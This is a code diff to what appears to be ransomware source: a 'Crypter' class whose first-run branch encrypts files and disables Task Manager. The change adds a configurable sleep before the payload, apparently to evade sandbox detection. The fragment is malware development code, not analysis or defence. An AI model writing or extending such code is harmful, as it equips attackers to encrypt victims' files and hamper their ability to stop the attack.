@@ -45,6 +45,10 @@ class Crypter(Base.Base):
         # FIRST RUN
         # Encrypt!
         if not os.path.isfile(self.encrypted_file_list):
+            # Time Delay
+            if "time_delay" in self.__config:
+                time.sleep(int(self.__config["time_delay"]))
+
             # Disable Task Manager
             if self.__config["disable_task_manager"]:
                 self.task_manager = TaskManager()
